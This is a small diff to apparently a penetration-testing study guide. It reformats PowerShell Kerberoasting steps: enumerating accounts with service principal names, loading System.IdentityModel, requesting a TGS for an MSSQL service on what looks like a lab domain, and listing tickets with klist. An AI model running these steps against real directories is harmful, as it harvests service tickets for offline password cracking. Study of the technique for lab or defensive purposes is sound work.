@@ -370,7 +370,8 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincip
 **3. Request a TGS:**
 ```powershell
 # Request a TGS - Phase 1
-Add-Type -AssemblyNAme System.IdentityModel                                                                                 # Request a TGS - Phase 2 
+Add-Type -AssemblyNAme System.IdentityModel
+# Request a TGS - Phase 2
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporate.local" 
 # Check if the TGS has been granted
 klist
